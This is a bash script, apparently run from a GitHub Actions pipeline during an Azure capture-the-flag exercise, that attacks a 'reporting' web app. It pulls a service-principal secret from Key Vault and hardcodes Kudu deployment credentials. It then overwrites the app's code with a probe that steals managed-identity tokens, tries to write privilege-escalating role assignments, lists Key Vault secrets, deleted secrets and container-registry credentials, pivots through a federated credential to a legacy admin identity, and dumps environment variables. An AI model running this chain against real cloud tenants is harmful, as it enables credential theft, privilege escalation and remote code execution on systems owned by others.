#!/usr/bin/env bash
set -uo pipefail

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

# Get reporting-service credentials from KV prod
RS_CID=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal 2>/dev/null | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v.get("appId",""))' 2>/dev/null)
RS_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal 2>/dev/null | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v.get("clientSecret",""))' 2>/dev/null)
echo "reporting-service: cid=$RS_CID"

# Get reporting-service ARM token
RS_ARM=$(python3 -c "
import urllib.request, urllib.parse, json
r = urllib.request.urlopen(urllib.request.Request(
  'https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token',
  data=urllib.parse.urlencode({'client_id': '$RS_CID', 'client_secret': '$RS_SEC',
    'grant_type': 'client_credentials', 'scope': 'https://management.azure.com/.default'}).encode(),
  method='POST'), timeout=20)
print(json.loads(r.read()).get('access_token',''))
" 2>/dev/null)
echo "RS_ARM len=${#RS_ARM}"

# Get reporting app publish XML for Kudu access
KUDU_USER="\$app-tbl-reporting-prod"
KUDU_PASS="Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xxt7Ye5A"
KUDU_BASE="https://app-tbl-reporting-prod.scm.azurewebsites.net"
echo "Using known Kudu credentials"

# Deploy app41.py to reporting app via ZipDeploy
cat << 'PYEOF' > /tmp/probe_app.py
#!/usr/bin/env python3
"""CTF probe app: runs as the UAMI inside the reporting app container"""
import os, json, urllib.request, urllib.parse, urllib.error, sys

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE = "https://management.azure.com"
UAMI_CID = "7a85156a-01c4-4e61-8472-40a92107159b"
UAMI_OID = "f64d08c7-fde6-4553-99c8-5bf73666ee8c"
REPORTING_RG = "rg-tbl-reporting-prod-eus"
PLATFORM_RG = "rg-tbl-platform-prod-sea"
KV_PROD = "kv-tbl-prod-x3euoz"
KV_SEC = "kv-tbl-sec-x3euoz"
LEGACY_ADMIN_APPID = "891fb158-e02c-4428-a885-53b811f369c0"

def msi_tok(resource, client_id=UAMI_CID):
    endpoint = os.environ.get("IDENTITY_ENDPOINT", "")
    header = os.environ.get("IDENTITY_HEADER", "")
    if not endpoint:
        return f"ERR:NO_IDENTITY_ENDPOINT"
    try:
        url = f"{endpoint}?api-version=2019-08-01&resource={resource}&client_id={client_id}"
        r = urllib.request.urlopen(urllib.request.Request(url, headers={"X-IDENTITY-HEADER": header}), timeout=15)
        return json.loads(r.read()).get("access_token", "ERR:NO_TOKEN")
    except Exception as e:
        return f"ERR:{str(e)[:100]}"

def http(url, tok, method="GET", data=None):
    h = {"Authorization": "Bearer " + tok}
    if data:
        if isinstance(data, dict): data = json.dumps(data).encode(); h["Content-Type"] = "application/json"
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, data=data, method=method, headers=h), timeout=20)
        return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")[:800]
    except Exception as e:
        return 0, str(e)[:200]

results = {}

# 1. Get UAMI ARM token
ARM_TOK = msi_tok("https://management.azure.com/")
results["uami_arm_tok_len"] = len(ARM_TOK) if not ARM_TOK.startswith("ERR") else ARM_TOK

if not ARM_TOK.startswith("ERR"):
    # UAMI role assignments at subscription level
    s, b = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{UAMI_OID}%27", ARM_TOK)
    results["uami_roles_sub"] = f"{s}:{b[:1000]}"

    # Reporting RG role assignments (using UAMI's own token)
    s2, b2 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=atScope()", ARM_TOK)
    results["reporting_rg_roles_atscope"] = f"{s2}:{b2[:2000]}"

    # ALL resources accessible to UAMI
    s4, b4 = http(f"{ARM_BASE}/subscriptions/{SUB}/resources?api-version=2021-04-01", ARM_TOK)
    results["uami_all_resources"] = f"{s4}:{b4[:3000]}"

    # Try write role assignment at KV sec (to test if UAMI has Owner/UAA there)
    import uuid
    test_ra_id = str(uuid.uuid4())
    ra_body = {"properties": {"roleDefinitionId": f"/subscriptions/{SUB}/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6", "principalId": UAMI_OID, "principalType": "ServicePrincipal"}}
    s7, b7 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.KeyVault/vaults/{KV_SEC}/providers/Microsoft.Authorization/roleAssignments/{test_ra_id}?api-version=2022-04-01", ARM_TOK, method="PUT", data=ra_body)
    results["uami_ra_write_kvsec"] = f"{s7}:{b7[:500]}"

    # Try subscription-level role assignment write
    s8, b8 = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments/{test_ra_id}?api-version=2022-04-01", ARM_TOK, method="PUT", data=ra_body)
    results["uami_ra_write_sub"] = f"{s8}:{b8[:500]}"

    # Storefront app settings
    s5, b5 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01", ARM_TOK, method="POST")
    results["storefront_settings_uami"] = f"{s5}:{b5[:800]}"

    # ACR credentials
    s_acr, b_acr = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/listCredentials?api-version=2023-07-01", ARM_TOK, method="POST")
    results["acr_creds_uami"] = f"{s_acr}:{b_acr[:500]}"

# 2. UAMI vault token
VAULT_TOK = msi_tok("https://vault.azure.net/")
results["uami_vault_tok_len"] = len(VAULT_TOK) if not VAULT_TOK.startswith("ERR") else VAULT_TOK
if not VAULT_TOK.startswith("ERR"):
    s_kp, b_kp = http(f"https://{KV_PROD}.vault.azure.net/secrets?api-version=7.4", VAULT_TOK)
    results["kv_prod_uami"] = f"{s_kp}:{b_kp[:500]}"
    s_ks, b_ks = http(f"https://{KV_SEC}.vault.azure.net/secrets?api-version=7.4", VAULT_TOK)
    results["kv_sec_uami"] = f"{s_ks}:{b_ks[:500]}"
    for name in ['flag', 'ctf-flag', 'tbl-flag']:
        sv, bv = http(f"https://{KV_SEC}.vault.azure.net/secrets/{name}?api-version=7.4", VAULT_TOK)
        if sv == 200:
            results[f"FLAG_{name}"] = bv

# 3. tbl-legacy-admin via msi-pivot-ctf federated credential
XCHG_TOK = msi_tok("api://AzureADTokenExchange")
results["uami_xchg_tok_len"] = len(XCHG_TOK) if not XCHG_TOK.startswith("ERR") else XCHG_TOK
if not XCHG_TOK.startswith("ERR"):
    try:
        def get_la_tok(scope):
            r = urllib.request.urlopen(urllib.request.Request(
                f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
                data=urllib.parse.urlencode({"client_id": LEGACY_ADMIN_APPID,
                    "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
                    "client_assertion": XCHG_TOK, "grant_type": "client_credentials", "scope": scope
                }).encode(), method="POST"), timeout=20)
            return json.loads(r.read()).get("access_token", "")

        la_arm = get_la_tok("https://management.azure.com/.default")
        results["legacy_admin_arm_len"] = len(la_arm)
        if la_arm:
            s_la, b_la = http(f"{ARM_BASE}/subscriptions/{SUB}/resources?api-version=2021-04-01", la_arm)
            results["legacy_admin_resources"] = f"{s_la}:{b_la[:2000]}"
            # Check own role assignments
            LA_OID = "43834909-47cf-4a4a-8048-e323b4897ed3"
            s_la2, b_la2 = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{LA_OID}%27", la_arm)
            results["legacy_admin_own_roles"] = f"{s_la2}:{b_la2[:500]}"
            # Write RA with tbl-legacy-admin token (if it has Owner)
            s_law, b_law = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments/{test_ra_id}?api-version=2022-04-01", la_arm, method="PUT", data=ra_body)
            results["legacy_admin_ra_write"] = f"{s_law}:{b_law[:500]}"

        la_vault = get_la_tok("https://vault.azure.net/.default")
        results["legacy_admin_vault_len"] = len(la_vault)
        if la_vault:
            s_lav, b_lav = http(f"https://{KV_PROD}.vault.azure.net/secrets?api-version=7.4", la_vault)
            results["kv_prod_la"] = f"{s_lav}:{b_lav[:1000]}"
            s_lavs, b_lavs = http(f"https://{KV_SEC}.vault.azure.net/secrets?api-version=7.4", la_vault)
            results["kv_sec_la"] = f"{s_lavs}:{b_lavs[:500]}"
            # Try to get deleted secrets
            s_ldel, b_ldel = http(f"https://{KV_PROD}.vault.azure.net/deletedsecrets?api-version=7.4", la_vault)
            results["kv_prod_deleted_la"] = f"{s_ldel}:{b_ldel[:1000]}"
            s_ldel2, b_ldel2 = http(f"https://{KV_SEC}.vault.azure.net/deletedsecrets?api-version=7.4", la_vault)
            results["kv_sec_deleted_la"] = f"{s_ldel2}:{b_ldel2[:500]}"
    except Exception as e:
        results["legacy_admin_xchg_err"] = str(e)[:300]

# 4. Environment variables dump
results["IDENTITY_ENDPOINT"] = os.environ.get("IDENTITY_ENDPOINT", "NOT_SET")
env_dump = {k: v[:200] for k, v in os.environ.items()}
results["env_dump"] = json.dumps(env_dump)

print("=== APP41 RESULTS ===")
for k, v in sorted(results.items()):
    print(f"[{k}]: {str(v)[:800]}")
print("=== END ===")
PYEOF

echo "Created probe_app.py, deploying via Kudu..."

# Create zip with new app.py
cd /tmp
zip -q probe.zip probe_app.py
ls -la probe.zip

# Deploy via ZipDeploy to /home/site/wwwroot (overwrite main app.py)
KUDU_AUTH=$(python3 -c "import base64; print(base64.b64encode(b'\$app-tbl-reporting-prod:Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xxt7Ye5A').decode())")

# First put probe_app.py as app.py
python3 -c "
import urllib.request, base64

auth = base64.b64encode(b'\$app-tbl-reporting-prod:Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xxt7Ye5A').decode()
with open('/tmp/probe_app.py', 'rb') as f:
    content = f.read()

req = urllib.request.Request(
    'https://app-tbl-reporting-prod.scm.azurewebsites.net/api/vfs/site/wwwroot/app.py',
    data=content, method='PUT',
    headers={'Authorization': f'Basic {auth}', 'Content-Type': 'text/plain', 'If-Match': '*'}
)
try:
    r = urllib.request.urlopen(req, timeout=30)
    print(f'VFS PUT: {r.status}')
except Exception as e:
    print(f'VFS PUT err: {e}')
" 2>/dev/null

echo "Waiting for app to restart..."
sleep 5

# Execute via Kudu command API
python3 -c "
import urllib.request, urllib.error, json, base64, time

auth = base64.b64encode(b'\$app-tbl-reporting-prod:Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xxt7Ye5A').decode()

# Kill gunicorn to force restart with new code
kill_req = urllib.request.Request(
    'https://app-tbl-reporting-prod.scm.azurewebsites.net/api/command',
    data=json.dumps({'command': 'pkill -f gunicorn || true', 'dir': '/home/site/wwwroot'}).encode(),
    method='POST',
    headers={'Authorization': f'Basic {auth}', 'Content-Type': 'application/json'}
)
try:
    urllib.request.urlopen(kill_req, timeout=15)
    print('Killed gunicorn')
except: pass
time.sleep(3)

# Run probe directly
run_req = urllib.request.Request(
    'https://app-tbl-reporting-prod.scm.azurewebsites.net/api/command',
    data=json.dumps({'command': 'python3 /home/site/wwwroot/app.py 2>&1', 'dir': '/home/site/wwwroot'}).encode(),
    method='POST',
    headers={'Authorization': f'Basic {auth}', 'Content-Type': 'application/json'}
)
try:
    r = urllib.request.urlopen(run_req, timeout=60)
    result = json.loads(r.read())
    print('OUTPUT:')
    print(result.get('Output', '')[:8000])
    print('ERROR:', result.get('Error', '')[:1000])
    print('ExitCode:', result.get('ExitCode', -1))
except Exception as e:
    print(f'Run err: {e}')
" 2>/dev/null

echo "DONE"
